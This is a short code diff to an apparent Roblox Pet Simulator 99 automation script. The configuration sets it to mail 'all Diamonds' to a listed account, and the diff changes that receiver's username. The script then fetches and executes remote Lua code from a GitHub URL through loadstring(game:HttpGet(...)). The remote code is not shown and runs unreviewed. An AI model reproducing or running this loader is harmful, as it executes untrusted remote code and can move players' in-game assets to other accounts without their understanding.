@@ -36,7 +36,7 @@ _G.GMAIL_ITEMS = {
   ["Send all Diamonds"] = {Class = "Currency", Id = "Diamonds", KeepAmount = "2m", MinAmount = "10m"},
 }
 _G.GMAIL_RECEIVERS = {
-    "hoang071097",
+    "kimmuot0309",
 }
 _G.GMAIL_DELAY  = 0
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/GScripts-Events"))()
